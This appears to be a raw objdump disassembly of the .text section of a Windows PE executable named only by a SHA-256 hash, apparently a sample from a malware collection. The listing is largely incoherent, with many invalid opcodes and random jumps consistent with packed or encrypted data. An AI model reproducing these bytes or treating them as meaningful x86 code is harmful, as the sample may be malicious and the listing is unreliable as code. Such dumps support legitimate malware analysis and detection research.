
dad528d068d6bd4463eee4bf56b82bc9aa6d8b288ff7b4fa3707292ea74cec63.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sbb    al,0x5
  411002:	jns    0x410faa
  411004:	mov    ecx,0x9c4a7f71
  411009:	ds mov ebp,0x7d9c25ec
  41100f:	daa    
  411010:	cdq    
  411011:	add    al,0x36
  411013:	(bad)  
  411014:	adc    BYTE PTR [esi+0x1655ec6c],ch
  41101a:	jmp    0x411059
  41101c:	imul   edx,DWORD PTR [eax-0x2f],0x7f5c3084
  411023:	rcr    BYTE PTR [esi+0x65],0x9d
  411027:	mov    ds:0x60dd39ff,al
  41102c:	loop   0x411085
  41102e:	ins    DWORD PTR es:[edi],dx
  41102f:	mov    eax,0xd1125399
  411034:	adc    DWORD PTR [ecx+edx*2],eax
  411037:	add    ecx,DWORD PTR [ecx-0x1a1e1970]
  41103d:	push   0x22e83ffc
  411042:	push   0xc78c44d
  411047:	into   
  411048:	mov    bl,0x5d
  41104a:	loopne 0x411072
  41104c:	retf   
  41104d:	mov    al,0xc5
  41104f:	hlt    
  411050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411051:	or     dh,BYTE PTR [ecx-0x17]
  411054:	lods   eax,DWORD PTR ds:[esi]
  411055:	test   al,0xc8
  411057:	sub    dh,BYTE PTR [edi-0x30]
  41105a:	fucomip st,st(7)
  41105c:	pop    es
  41105d:	scas   al,BYTE PTR es:[edi]
  41105e:	nop
  41105f:	inc    ecx
  411060:	fcmovnb st,st(4)
  411062:	shr    DWORD PTR [edx+0x3251f90e],0x66
  411069:	push   cs
  41106a:	and    ebx,DWORD PTR [ecx+0x783b8617]
  411070:	cmp    eax,0xd5521cac
  411075:	call   FWORD PTR [ebx-0x10]
  411078:	(bad)  
  41107a:	test   eax,0xe07503ab
  41107f:	lock and DWORD PTR es:[eax],esi
  411083:	stos   BYTE PTR es:[edi],al
  411084:	pushf  
  411085:	mov    bl,0x79
  411087:	scas   eax,DWORD PTR es:[edi]
  411088:	mov    WORD PTR [esi],ds
  41108a:	aad    0x40
  41108c:	cs pop ds
  41108e:	je     0x4110b9
  411090:	jae    0x4110ef
  411092:	ret    0xf616
  411095:	outs   dx,DWORD PTR ds:[esi]
  411096:	add    BYTE PTR [ebp-0x44],bl
  411099:	bound  ebx,QWORD PTR [edi]
  41109b:	mov    ecx,DWORD PTR [edx-0x71]
  41109e:	lock add edx,ebx
  4110a1:	jno    0x411106
  4110a3:	ror    DWORD PTR [ebx-0x60],1
  4110a6:	pop    ss
  4110a7:	push   cs
  4110a8:	inc    esi
  4110a9:	pusha  
  4110aa:	ret    0x8047
  4110ad:	pusha  
  4110ae:	xor    cl,BYTE PTR [edi]
  4110b0:	mov    WORD PTR [eax],?
  4110b2:	cli    
  4110b3:	fwait
  4110b4:	inc    ebp
  4110b5:	push   ss
  4110b6:	shl    BYTE PTR ds:0xbe63dddd,0x6
  4110bd:	in     al,0x2c
  4110bf:	pop    esp
  4110c0:	push   cs
  4110c1:	mov    edx,0x97cc8eeb
  4110c6:	jle    0x411105
  4110c8:	sbb    ebp,DWORD PTR [edi+edi*4+0x68]
  4110cc:	call   0x553f:0x25801880
  4110d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d4:	inc    cl
  4110d6:	jmp    0xb0941ce6
  4110db:	in     al,dx
  4110dc:	mov    ch,0x73
  4110de:	mov    edi,0x883eaae9
  4110e3:	inc    esi
  4110e4:	popf   
  4110e5:	popa   
  4110e6:	mov    dl,0x14
  4110e8:	(bad)
  4110ed:	retf   0x609c
  4110f0:	add    eax,DWORD PTR [ebx-0x70]
  4110f3:	test   DWORD PTR [ecx],eax
  4110f5:	sub    bl,dl
  4110f7:	in     al,dx
  4110f8:	rcl    dh,cl
  4110fa:	mov    esp,0x3d18daca
  4110ff:	push   ebp
  411100:	pop    es
  411101:	out    0x8c,eax
  411103:	retf   
  411104:	and    dh,BYTE PTR [eax-0x31]
  411107:	dec    ebp
  411108:	shl    BYTE PTR [edi],1
  41110a:	jnp    0x411090
  41110c:	inc    eax
  41110d:	stos   BYTE PTR es:[edi],al
  41110e:	outs   dx,DWORD PTR ds:[esi]
  41110f:	jmp    0x1fde2990
  411114:	out    dx,al
  411115:	xor    edx,DWORD PTR [edi]
  411117:	lock pop edi
  411119:	add    eax,0xb3961ac5
  41111e:	dec    ebp
  41111f:	add    ch,bh
  411121:	sbb    cl,dl
  411123:	xchg   esp,eax
  411124:	cli    
  411125:	popf   
  411126:	sar    BYTE PTR [esi-0x64],0x1c
  41112a:	lods   eax,DWORD PTR ds:[esi]
  41112b:	sub    al,0x76
  41112d:	repnz adc eax,DWORD PTR [edx-0x2c]
  411131:	lahf   
  411132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411133:	pop    edi
  411134:	sbb    DWORD PTR [ebp+0x36],ebx
  411137:	sbb    ebx,DWORD PTR [ebp+0x68c89d84]
  41113d:	dec    ebp
  41113e:	pop    ecx
  41113f:	pushf  
  411140:	inc    ebp
  411141:	scas   eax,DWORD PTR es:[edi]
  411142:	jle    0x4110c8
  411144:	or     BYTE PTR [edi],ah
  411146:	sbb    DWORD PTR [ecx-0x70],eax
  411149:	js     0x4111be
  41114b:	ss ds jno 0x411115
  41114f:	leave  
  411150:	stos   BYTE PTR es:[edi],al
  411151:	xlat   BYTE PTR ds:[ebx]
  411152:	ret    0xd6bf
  411155:	xor    esp,DWORD PTR [eax]
  411157:	push   ebp
  411158:	jecxz  0x41112c
  41115a:	test   eax,0xe91a7438
  41115f:	jns    0x4111d3
  411161:	mov    eax,ds:0x3441e47e
  411166:	(bad)  
  411167:	imul   edi,DWORD PTR [edi-0x16edb8b3],0x7b
  41116e:	in     al,dx
  41116f:	cmp    BYTE PTR [edi],ah
  411171:	xchg   esi,eax
  411172:	jno    0x4111dd
  411174:	push   DWORD PTR [ecx]
  411176:	ret    
  411177:	in     al,0x2f
  411179:	inc    eax
  41117a:	sar    BYTE PTR [edi-0x71],cl
  41117d:	scas   al,BYTE PTR es:[edi]
  41117e:	pop    esp
  41117f:	(bad)  
  411180:	fsubr  DWORD PTR [eax+0x78]
  411183:	mul    DWORD PTR [esi]
  411185:	mov    al,ds:0x800d761e
  41118a:	imul   edx,DWORD PTR [edi-0x2fdc0287],0x50
  411191:	stos   BYTE PTR es:[edi],al
  411192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411193:	bound  esp,QWORD PTR ds:[ebp+0x70117139]
  41119a:	and    eax,0x58938cdd
  41119f:	aam    0x72
  4111a1:	lds    ecx,FWORD PTR [ebp+esi*8-0xf]
  4111a5:	mov    esp,0xfe23af72
  4111aa:	jno    0x41118f
  4111ac:	repz cmp edx,DWORD PTR [ebp+0x45c03553]
  4111b3:	adc    eax,0x95782e7
  4111b8:	cmovb  edi,esi
  4111bb:	jmp    0xafc25c3b
  4111c0:	jno    0x411142
  4111c2:	mov    edi,0x664deac2
  4111c7:	inc    eax
  4111c8:	std    
  4111c9:	xor    al,0x2d
  4111cb:	cld    
  4111cc:	xchg   edx,eax
  4111cd:	not    BYTE PTR [eax]
  4111cf:	stos   DWORD PTR es:[edi],eax
  4111d0:	inc    edx
  4111d1:	jge    0x4111af
  4111d3:	sub    DWORD PTR [ebx],ebx
  4111d5:	cmp    DWORD PTR [edx+0xe],edi
  4111d8:	mov    eax,ds:0x10b7929b
  4111dd:	lods   al,BYTE PTR ds:[esi]
  4111de:	inc    ecx
  4111df:	cmc    
  4111e0:	loop   0x4111ce
  4111e2:	xor    esi,ecx
  4111e4:	inc    edx
  4111e5:	dec    ebp
  4111e6:	fstp   st(3)
  4111e8:	push   DWORD PTR [ecx*2-0x2b3d6871]
  4111ef:	out    dx,eax
  4111f0:	mov    dh,0xa1
  4111f2:	jp     0x411209
  4111f4:	mov    eax,ds:0x46e46f86
  4111f9:	js     0x411256
  4111fb:	stos   DWORD PTR es:[edi],eax
  4111fc:	or     DWORD PTR [esi+0x1af171bb],esp
  411202:	lea    edi,[ebx-0x1c2a0efb]
  411208:	les    ebp,FWORD PTR [edx+0x73]
  41120b:	(bad)  
  41120c:	cdq    
  41120d:	addr16 inc ebx
  41120f:	pop    ss
  411210:	xor    bh,bl
  411212:	call   0x5fd4:0xd60816bb
  411219:	xor    al,0x76
  41121b:	push   ebx
  41121c:	loopne 0x411276
  41121e:	add    DWORD PTR [ecx],edx
  411220:	hlt    
  411221:	xor    eax,0xa68caa0f
  411226:	jmp    0x202df55b
  41122b:	mov    ds:0xb43e3707,al
  411230:	jmp    0x411242
  411232:	shl    BYTE PTR [edx+0x21abfb25],0x16
  411239:	jge    0x4111bb
  41123b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41123c:	ja     0x4111ee
  41123e:	adc    al,0xda
  411240:	rcr    BYTE PTR [esi],1
  411242:	mov    ecx,0x8735872
  411247:	loop   0x411242
  411249:	ret    
  41124a:	lods   eax,DWORD PTR ds:[esi]
  41124b:	mov    bh,0x6f
  41124d:	stos   BYTE PTR es:[edi],al
  41124e:	mov    ecx,0x24d3e18b
  411253:	mov    ecx,0x9dcb1d00
  411258:	pop    ebp
  411259:	into   
  41125a:	enter  0x1c0e,0x48
  41125e:	fld    DWORD PTR [eax+0x5387720b]
  411264:	and    dh,BYTE PTR [ebx+0x5f]
  411267:	loope  0x41124d
  411269:	xchg   ebp,eax
  41126a:	mov    esi,0x79c6419c
  41126f:	gs popa 
  411271:	scas   eax,DWORD PTR es:[edi]
  411272:	mov    edi,0xd410e4f3
  411277:	sar    al,1
  411279:	inc    ecx
  41127a:	xor    eax,0x8a784d2
  41127f:	inc    edx
  411280:	jns    0x41121e
  411282:	pop    ebp
  411283:	jne    0x4112e4
  411285:	xor    ebp,DWORD PTR [ecx+0x4e]
  411288:	dec    edi
  411289:	cs ja  0x4112b1
  41128c:	mov    edx,0xd7fea0e2
  411291:	jmp    0x26b9:0xed12bd40
  411298:	mov    edi,0xf8cfab2f
  41129d:	bound  edx,QWORD PTR [edi+eiz*8]
  4112a0:	into   
  4112a1:	jno    0x4112e0
  4112a3:	and    al,0xde
  4112a5:	push   ebx
  4112a6:	mov    DWORD PTR [eax+0xbd6875e],0xa205f642
  4112b0:	fs outs dx,DWORD PTR ds:[esi]
  4112b3:	sbb    al,0x78
  4112b5:	sbb    DWORD PTR [esi+0x2b],ebx
  4112b8:	jge    0x411307
  4112ba:	push   ds
  4112bb:	mov    bl,BYTE PTR [ebx]
  4112bd:	(bad)  
  4112be:	sbb    eax,0x38e553a8
  4112c3:	sub    BYTE PTR [ecx+0x2c56817b],0x85
  4112ca:	int3   
  4112cb:	sub    dh,BYTE PTR [edi-0x20]
  4112ce:	sub    ebx,ecx
  4112d0:	or     dl,BYTE PTR [eax+edi*4+0x60]
  4112d4:	imul   edi,DWORD PTR [esi+0x79],0xffffffdc
  4112d8:	iret   
  4112d9:	inc    edi
  4112da:	ins    DWORD PTR es:[edi],dx
  4112db:	jne    0x4112cd
  4112dd:	push   cs
  4112de:	pop    eax
  4112df:	cld    
  4112e0:	test   al,0x99
  4112e2:	in     eax,dx
  4112e3:	xor    ecx,DWORD PTR [edx+0x18]
  4112e6:	pop    ss
  4112e7:	js     0x411334
  4112e9:	mov    DWORD PTR [eax-0x6c15e75e],ecx
  4112ef:	or     al,0xda
  4112f1:	mov    dh,0xa
  4112f3:	lods   al,BYTE PTR ds:[esi]
  4112f4:	cmp    al,0x36
  4112f6:	xlat   BYTE PTR ds:[ebx]
  4112f7:	sahf   
  4112f8:	push   cs
  4112f9:	cmp    edx,DWORD PTR [edi-0x6d]
  4112fc:	mov    bh,0x98
  4112fe:	mov    esp,0x5ba3ce72
  411303:	cmp    DWORD PTR [ebx],0xfd99f7b
  411309:	jnp    0x41133d
  41130b:	and    eax,0xd4771c07
  411310:	aad    0xdb
  411312:	mov    edi,0x2c78d68a
  411317:	js     0x411332
  411319:	push   ebx
  41131a:	jbe    0x4112f6
  41131c:	loopne 0x4112ca
  41131e:	pop    ecx
  41131f:	push   ss
  411320:	sub    eax,DWORD PTR [ebx+0x12]
  411323:	xchg   ecx,eax
  411324:	hlt    
  411325:	push   ss
  411326:	push   ds
  411327:	mov    ch,0x15
  411329:	jae    0x4112cc
  41132b:	loop   0x41138e
  41132d:	shl    BYTE PTR [esi+eiz*1-0x40172f17],1
  411334:	xor    BYTE PTR [edx+0x5ede5a1c],0xa4
  41133b:	mov    eax,?
  41133d:	push   ebx
  41133e:	cmp    dh,cl
  411340:	test   BYTE PTR [esi],bl
  411342:	mov    edi,0xdb4b31d0
  411347:	fld    QWORD PTR [edx]
  411349:	add    eax,0xf225068b
  41134e:	fucom  st(6)
  411350:	push   es
  411351:	es sti 
  411353:	mov    edi,0xf58df6df
  411358:	xor    al,0x37
  41135a:	retf   0xfc47
  41135d:	rcl    BYTE PTR [bx+0x4a0b],1
  411362:	push   ebx
  411363:	test   al,0x59
  411365:	retf   
  411366:	jb     0x41135f
  411368:	dec    edi
  411369:	mov    bh,0x9d
  41136b:	dec    esp
  41136c:	inc    esp
  41136d:	mov    ch,0x27
  41136f:	pop    ds
  411370:	xchg   ebx,eax
  411371:	gs jae 0x4113cb
  411374:	das    
  411375:	add    edi,DWORD PTR [ebp-0x3e]
  411378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411379:	mov    bh,0x3f
  41137b:	pop    es
  41137c:	cmc    
  41137d:	push   0x2f8ff54b
  411382:	ret    0x2fe7
  411385:	stos   BYTE PTR es:[edi],al
  411386:	pop    edx
  411387:	sub    BYTE PTR [edi+0x4172df5d],dh
  41138d:	mov    al,0x96
  41138f:	push   edi
  411390:	push   ecx
  411391:	cld    
  411392:	pop    eax
  411393:	push   esp
  411394:	scas   eax,DWORD PTR es:[edi]
  411395:	lahf   
  411396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411397:	sbb    DWORD PTR [ecx-0x2fb674a3],edi
  41139d:	pop    ebp
  41139e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41139f:	xchg   DWORD PTR [edi-0x28f87fec],edi
  4113a5:	or     eax,0xda5a7d41
  4113aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ab:	and    eax,0x48f6819f
  4113b0:	fsub   DWORD PTR [ecx]
  4113b2:	data16 jne 0x411362
  4113b5:	xchg   esi,eax
  4113b6:	iret   
  4113b7:	out    dx,al
  4113b8:	test   BYTE PTR [edi],cl
  4113ba:	jmp    0xcc61:0xc171138e
  4113c1:	xor    edx,DWORD PTR [edi+0x28224c3b]
  4113c7:	jmp    0x411401
  4113c9:	call   0xb8d3:0x86627fac
  4113d0:	sub    esi,DWORD PTR [edx-0x60]
  4113d3:	mov    ebp,0x6893f8f
  4113d8:	lods   eax,DWORD PTR ds:[esi]
  4113d9:	or     BYTE PTR [ebx],0x2c
  4113dc:	jl     0x411421
  4113de:	dec    ebx
  4113df:	idiv   BYTE PTR [ecx+edx*2+0xbaa3bf9]
  4113e6:	jns    0x411420
  4113e8:	int3   
  4113e9:	push   esp
  4113ea:	das    
  4113eb:	mov    eax,0xae681be8
  4113f0:	and    BYTE PTR [eax+0x1115a72d],dh
  4113f6:	test   edx,ebp
  4113f8:	retf   0x1963
  4113fb:	jb     0x41143d
  4113fd:	inc    edi
  4113fe:	mov    al,BYTE PTR [ebx+edi*1]
  411401:	push   ebx
  411402:	ror    DWORD PTR [ebp+esi*8+0x3a1ba3d5],cl
  411409:	frstor [eax-0x55982f8d]
  41140f:	pop    esi
  411410:	xor    DWORD PTR [eax],eax
  411412:	xchg   esp,eax
  411413:	xchg   BYTE PTR [bp+si-0x23ed],bh
  411418:	scas   eax,DWORD PTR es:[edi]
  411419:	rcl    DWORD PTR [esi-0x65],1
  41141c:	fs je  0x41144c
  41141f:	out    dx,al
  411420:	int3   
  411421:	int3   
  411422:	sbb    bl,BYTE PTR [edi+0x37ef8119]
  411428:	xchg   BYTE PTR [edx+0x53c6e50c],cl
  41142e:	or     eax,0x9fbf8556
  411433:	jge    0x411480
  411435:	push   edx
  411436:	fbstp  TBYTE PTR ds:0x55a6cdd4
  41143c:	pop    ss
  41143d:	mov    esi,0xf3497a89
  411442:	xchg   ebx,eax
  411443:	lahf   
  411444:	push   esi
  411445:	das    
  411446:	xchg   ebx,eax
  411447:	push   0x45
  411449:	movntq QWORD PTR [ecx-0x693bc18d],mm1
  411450:	xchg   ebx,eax
  411451:	xchg   ecx,eax
  411452:	icebp  
  411453:	mov    ebp,0x3faeb7bf
  411458:	je     0x4114c0
  41145a:	cmp    al,0x9c
  41145c:	jb     0x4114bb
  41145e:	mov    ebp,0x812592d
  411463:	push   ds
  411464:	sub    DWORD PTR [ebx+edi*4-0x2c],0x96b6d2d4
  41146c:	or     eax,0x78
  41146f:	mov    esp,0xf9284095
  411474:	xchg   BYTE PTR [edx-0xc],dl
  411477:	loope  0x411452
  411479:	jge    0x411460
  41147b:	cmp    ebp,esp
  41147d:	aaa    
  41147e:	mov    ds:0xcc7aa0,al
  411483:	cld    
  411484:	and    DWORD PTR [esi+0x7e62f2df],ebx
  41148a:	jb     0x4114e9
  41148c:	nop
  41148d:	push   edx
  41148e:	add    eax,0x4ceb9ae2
  411493:	mov    dh,0x62
  411495:	cmp    al,0x18
  411497:	dec    ecx
  411498:	sbb    eax,DWORD PTR [edx-0x23cee5e]
  41149e:	push   0x66
  4114a0:	loope  0x411454
  4114a2:	pop    ds
  4114a3:	push   ebp
  4114a4:	shr    edi,cl
  4114a6:	jo     0x41150d
  4114a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a9:	loop   0x4114c7
  4114ab:	jae    0x41147b
  4114ad:	in     al,dx
  4114ae:	pop    ebp
  4114af:	mov    edx,0x4b673d3f
  4114b4:	js     0x4114f2
  4114b6:	mov    al,ds:0xfd971d18
  4114bb:	jae    0x41148c
  4114bd:	adc    eax,0x8e13cd44
  4114c2:	dec    ebx
  4114c3:	sub    al,0xee
  4114c5:	pop    ecx
  4114c6:	adc    eax,edi
  4114c8:	push   eax
  4114c9:	cmp    dl,BYTE PTR [edi]
  4114cb:	xchg   edi,eax
  4114cc:	adc    eax,DWORD PTR [eax-0x6ac56e3]
  4114d2:	out    0x48,eax
  4114d4:	clc    
  4114d5:	jl     0x411458
  4114d7:	les    edx,FWORD PTR cs:[eax+0x9]
  4114db:	xlat   BYTE PTR ds:[ebx]
  4114dc:	in     al,0x70
  4114de:	xor    dl,0x15
  4114e1:	cmp    eax,0x5802a59d
  4114e6:	dec    edi
  4114e7:	out    dx,eax
  4114e8:	ret    0x9665
  4114eb:	cmp    bh,BYTE PTR [esp+ebp*8]
  4114ee:	jne    0x4114a3
  4114f0:	sbb    eax,edx
  4114f2:	pop    edi
  4114f3:	(bad)  
  4114f4:	dec    ebp
  4114f5:	push   ds
  4114f6:	and    eax,0x7aa9b9c8
  4114fb:	in     al,dx
  4114fc:	ret    0x2d62
  4114ff:	imul   ecx,DWORD PTR [esi+0x62],0x7e
  411503:	loop   0x4114ae
  411505:	inc    ecx
  411506:	sbb    edx,DWORD PTR [edi]
  411508:	xlat   BYTE PTR ds:[ebx]
  411509:	dec    ebp
  41150a:	out    dx,al
  41150b:	jne    0x41151c
  41150d:	pop    edx
  41150e:	shl    BYTE PTR [edx+0x6f998f86],cl
  411514:	cmp    eax,0x9017de10
  411519:	push   es
  41151a:	jmp    0xfe701d77
  41151f:	add    DWORD PTR [ebx-0x48],ecx
  411522:	aad    0x8
  411524:	xchg   ebx,eax
  411525:	call   0xcc30e432
  41152a:	out    0x1,eax
  41152c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41152d:	out    0xa6,al
  41152f:	ret    0x5aa2
  411532:	fisub  WORD PTR [esi+eiz*8-0x61736999]
  411539:	mov    bh,0xbb
  41153b:	stos   BYTE PTR es:[edi],al
  41153c:	retf   
  41153d:	ins    BYTE PTR es:[edi],dx
  41153e:	xlat   BYTE PTR ds:[ebx]
  41153f:	into   
  411540:	jmp    FWORD PTR [ecx-0x44]
  411543:	out    0x42,al
  411545:	pop    es
  411546:	fwait
  411547:	lea    ebx,[edi+ebp*4-0x52]
  41154b:	imul   ebx,DWORD PTR [ebx-0x763d8995],0xf57e38bc
  411555:	jns    0x411540
  411557:	mov    ecx,0x6f5e1d3
  41155c:	mov    al,0x1d
  41155e:	jecxz  0x411533
  411560:	mov    al,0x45
  411562:	mov    dh,0x5a
  411564:	ret    0x49e7
  411567:	es dec esi
  411569:	daa    
  41156a:	in     al,dx
  41156b:	ficomp WORD PTR [esi-0x14]
  41156e:	inc    ebx
  41156f:	scas   al,BYTE PTR es:[edi]
  411570:	stc    
  411571:	outs   dx,DWORD PTR ds:[esi]
  411572:	jmp    edx
  411574:	loop   0x4114fc
  411576:	cmp    bh,BYTE PTR ds:0xc3faaee2
  41157c:	in     eax,dx
  41157d:	pop    edx
  41157e:	(bad)  
  41157f:	jns    0x411517
  411581:	xchg   edx,eax
  411582:	mov    edi,0xbea5efb8
  411587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411588:	loopne 0x411529
  41158a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41158b:	sub    al,0xe6
  41158d:	(bad)  
  41158e:	aas    
  41158f:	inc    eax
  411590:	xor    bl,al
  411592:	daa    
  411593:	imul   edi,DWORD PTR [edi],0x2400fdc
  411599:	push   edx
  41159a:	(bad)  
  41159b:	scas   eax,DWORD PTR es:[edi]
  41159c:	aad    0xfa
  41159e:	in     eax,dx
  41159f:	cmp    eax,ebp
  4115a1:	int    0x9d
  4115a3:	data16 cli 
  4115a5:	mov    eax,0xf66ce001
  4115aa:	sbb    ebx,DWORD PTR [ebx-0x521195ae]
  4115b0:	mov    cl,0xea
  4115b2:	data16 or BYTE PTR [ebx+eiz*8+0x65d66a14],0x30
  4115bb:	jb     0x411576
  4115bd:	std    
  4115be:	inc    edi
  4115bf:	inc    edx
  4115c0:	and    al,0xce
  4115c2:	dec    esp
  4115c3:	ret    0xd31d
  4115c6:	push   edx
  4115c7:	mov    eax,edx
  4115c9:	mov    al,0x9
  4115cb:	out    0x6e,al
  4115cd:	int3   
  4115ce:	sbb    al,0xc7
  4115d0:	cmp    DWORD PTR [ebp+0x2b],esp
  4115d3:	pop    ebp
  4115d4:	mov    ah,0x4
  4115d6:	pop    ebp
  4115d7:	test   bl,bl
  4115d9:	cld    
  4115da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115db:	mov    ds:0x5d60bed8,eax
  4115e0:	push   ebp
  4115e1:	inc    ebp
  4115e2:	enter  0x9c94,0xf0
  4115e6:	jl     0x41162a
  4115e8:	ins    DWORD PTR es:[edi],dx
  4115e9:	retf   0xab99
  4115ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ed:	push   esp
  4115ee:	mov    cl,0xb6
  4115f0:	dec    esi
  4115f1:	and    esp,edx
  4115f3:	xchg   ebp,ecx
  4115f5:	jmp    0x1393:0xc1017c96
  4115fc:	cmp    esp,DWORD PTR [eax-0x7e9458b1]
  411602:	cld    
  411603:	mov    bh,0x1d
  411605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411606:	test   BYTE PTR [ebx+0x16fb215],bh
  41160c:	fild   QWORD PTR [ecx+0x64]
  41160f:	push   edi
  411610:	jb     0x4115f0
  411612:	loopne 0x411662
  411614:	add    al,0xe6
  411616:	fimul  DWORD PTR [edi]
  411618:	adc    edi,DWORD PTR [ebp-0x5b]
  41161b:	popa   
  41161c:	imul   ecx,ecx,0xffffffe7
  41161f:	fwait
  411620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411621:	inc    edx
  411622:	loopne 0x4115da
  411624:	cmc    
  411625:	pusha  
  411626:	scas   al,BYTE PTR es:[edi]
  411627:	xor    esi,DWORD PTR [ebp+0x0]
  41162a:	ret    
  41162b:	sbb    dh,BYTE PTR [edx+ebp*8]
  41162e:	nop
  41162f:	dec    esp
  411630:	or     BYTE PTR [esi+0x6cee928],bl
  411636:	call   0x6f511d41
  41163b:	add    eax,DWORD PTR [edx+0x47]
  41163e:	call   FWORD PTR [ecx-0x33]
  411641:	js     0x41160c
  411643:	call   0x6fa4a98e
  411648:	mov    ds:0x150380dc,al
  41164d:	rol    DWORD PTR [edi],cl
  41164f:	popa   
  411650:	add    BYTE PTR [esi+0xf],0x4e
  411654:	jl     0x411697
  411656:	mov    esp,0xed16f155
  41165b:	scas   eax,DWORD PTR es:[edi]
  41165c:	out    0x4c,eax
  41165e:	push   ss
  41165f:	mov    cl,0x9c
  411661:	out    dx,al
  411662:	stc    
  411663:	cmp    DWORD PTR [eax+0x44],ebx
  411666:	add    BYTE PTR [ecx],al
  411668:	lea    ecx,[edi-0x70]
  41166b:	adc    esi,DWORD PTR [ebp*4-0x6037c512]
  411672:	jmp    0x41163e
  411674:	fisubr DWORD PTR [eax]
  411676:	cmp    ah,al
  411678:	or     BYTE PTR [ebx+0x35],ah
  41167b:	dec    ebp
  41167c:	adc    ecx,edi
  41167e:	xor    dh,BYTE PTR [edx]
  411680:	mov    ebx,0x4bff6098
  411685:	jno    0x4116bc
  411687:	dec    esi
  411688:	jmp    0x41167b
  41168a:	sbb    eax,0x1e5fb68
  41168f:	repnz test eax,0x2581a6ff
  411695:	pop    edi
  411696:	(bad)  
  411697:	ds push edx
  411699:	nop
  41169a:	mov    ds:0xa91949ff,eax
  41169f:	not    DWORD PTR [ecx+0x34]
  4116a2:	dec    eax
  4116a3:	push   ebp
  4116a4:	fist   WORD PTR [ecx+0x36]
  4116a7:	mov    eax,0xfd6ee685
  4116ac:	sbb    dh,BYTE PTR [ecx+esi*8+0x23c76fca]
  4116b3:	pop    ds
  4116b4:	and    eax,0xd31f20b0
  4116b9:	ss int3 
  4116bb:	add    ah,BYTE PTR [esi-0x60dcac87]
  4116c1:	icebp  
  4116c2:	jmp    0x411686
  4116c4:	pop    edx
  4116c5:	adc    al,dh
  4116c7:	add    bh,ah
  4116c9:	sbb    esi,DWORD PTR [edi-0x61]
  4116cc:	push   0x5998478d
  4116d1:	fisttp QWORD PTR [ecx+0x56f25023]
  4116d8:	mov    WORD PTR ds:0x3ca9352c,ds
  4116de:	retf   0xf041
  4116e1:	shl    DWORD PTR [esi+0x33],cl
  4116e4:	mov    bh,0x38
  4116e6:	add    bh,BYTE PTR [eiz*8-0x5dd0d311]
  4116ed:	test   al,0x12
  4116ef:	mov    ah,0xf7
  4116f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f2:	sbb    BYTE PTR [esi+ecx*2-0x57],dh
  4116f6:	int    0x24
  4116f8:	pop    esi
  4116f9:	aas    
  4116fa:	in     eax,0xd6
  4116fc:	out    dx,al
  4116fd:	fs mov ecx,0x2d3861ba
  411703:	pop    ecx
  411704:	cwde   
  411705:	(bad)  
  411707:	mov    bh,0xe1
  411709:	arpl   dx,ax
  41170b:	ficom  WORD PTR [esi]
  41170d:	pop    ds
  41170e:	pop    ecx
  41170f:	xchg   esi,eax
  411710:	(bad)  
  411711:	in     al,dx
  411712:	pop    edx
  411713:	into   
  411714:	bound  ebp,QWORD PTR cs:[edx-0x2adc5fe7]
  41171b:	int3   
  41171c:	fs mov ah,bl
  41171f:	mov    ch,0xea
  411721:	push   ebp
  411722:	mov    edx,0x6a096896
  411727:	scas   al,BYTE PTR es:[edi]
  411728:	mov    eax,ds:0x4363cb59
  41172d:	xchg   DWORD PTR [eax+0x52a0bbac],esi
  411733:	in     al,0x39
  411735:	cwde   
  411736:	outs   dx,BYTE PTR ds:[esi]
  411737:	fdiv   QWORD PTR [edi]
  411739:	adc    DWORD PTR [eax],esp
  41173b:	fcomp  DWORD PTR [eax+0x23]
  41173e:	cmp    eax,0x84242f1d
  411743:	cmp    eax,0x7669f66e
  411748:	xor    bh,BYTE PTR [ecx-0x7201ae86]
  41174e:	lea    esi,[edx+ebp*8-0x2f]
  411752:	dec    edx
  411753:	dec    ebx
  411754:	pop    ds
  411755:	mov    fs,WORD PTR [esi-0x7]
  411758:	je     0x4117ca
  41175a:	int    0xf1
  41175c:	xor    eax,DWORD PTR [edi+edx*4]
  41175f:	jle    0x4117d1
  411761:	adc    BYTE PTR [eax-0x5f7ee315],dh
  411767:	sbb    al,BYTE PTR [eax]
  411769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176a:	xchg   BYTE PTR [ebx],al
  41176c:	push   edi
  41176d:	hlt    
  41176e:	test   eax,0x273cb4e7
  411773:	xchg   edx,eax
  411774:	xor    al,0x72
  411776:	ret    0xa1fc
  411779:	mov    esp,0x275f2a20
  41177e:	(bad)  
  41177f:	imul   esp,DWORD PTR [ecx-0x42],0x875542a7
  411786:	rol    BYTE PTR [ebx+0x4c],0xac
  41178a:	mov    ch,BYTE PTR [esi-0x2f]
  41178d:	(bad)  
  41178f:	mov    ch,0x55
  411791:	cmp    eax,0x78d462aa
  411796:	repnz inc esp
  411798:	sbb    al,0xe8
  41179a:	mov    BYTE PTR gs:[ecx+ebx*4],bl
  41179e:	rcr    DWORD PTR [eax+0x3e],1
  4117a1:	or     eax,0x3b99be60
  4117a6:	loopne 0x4117e4
  4117a8:	test   al,0x70
  4117aa:	mov    eax,0xe15bd9c2
  4117af:	fwait
  4117b0:	mov    edi,0x3105065c
  4117b5:	imul   DWORD PTR [esi]
  4117b7:	cmp    al,0xa5
  4117b9:	mov    bl,0x39
  4117bb:	pop    edi
  4117bc:	mov    bh,0x9c
  4117be:	xchg   ebx,eax
  4117bf:	xor    BYTE PTR [ecx],0x30
